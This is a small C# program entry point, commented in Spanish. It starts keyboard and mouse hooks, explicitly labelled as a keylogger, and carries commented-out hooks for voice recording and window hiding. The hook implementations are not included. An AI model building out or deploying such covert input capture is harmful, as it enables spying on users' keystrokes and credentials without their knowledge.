using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace OtraPrueba2 {
    class Test
    {
        public static void Main()
        {
            //var handle = GetConsoleWindow(); // Obtener la ventana

            //Activa keylogger
            KeyboardHook.Initialize();
            
            //Activa control de mouse
            MouseHook.Initialize();

            //Activa registro de voz
            //Speech.Initialize();

            Application.Run();

            KeyboardHook.Dispose();
            MouseHook.Dispose();
        }

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
    }
}